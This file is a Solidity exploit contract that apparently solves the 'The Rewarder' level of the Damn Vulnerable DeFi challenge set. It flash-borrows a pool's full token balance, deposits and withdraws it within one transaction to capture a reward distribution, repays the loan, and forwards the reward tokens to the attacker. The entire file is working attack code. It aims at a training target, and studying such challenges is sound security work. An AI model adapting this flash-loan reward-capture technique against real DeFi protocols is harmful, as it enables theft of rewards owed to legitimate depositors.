// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title RewarderAttacker
 * @author Yasaman (Jasmine) Abtahi
 */

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {

    using SafeMath for uint256;
    using Address for address payable;
    FlashLoanerPool loanerPool;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    DamnValuableToken liquidityToken;

    constructor(address _FlashLoanerPool, address _TheRewarderPool, address _RewardToken, address _liquidityToken) {

        loanerPool = FlashLoanerPool(_FlashLoanerPool);
        rewarderPool = TheRewarderPool(_TheRewarderPool);
        rewardToken = RewardToken(_RewardToken);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function attack(address payable attacker) public {

        uint256 amount = liquidityToken.balanceOf(address(loanerPool));
        loanerPool.flashLoan(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));        
    }

    function receiveFlashLoan(uint256 amount) public {
        
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanerPool), amount);
    }

    receive() external payable {}
}

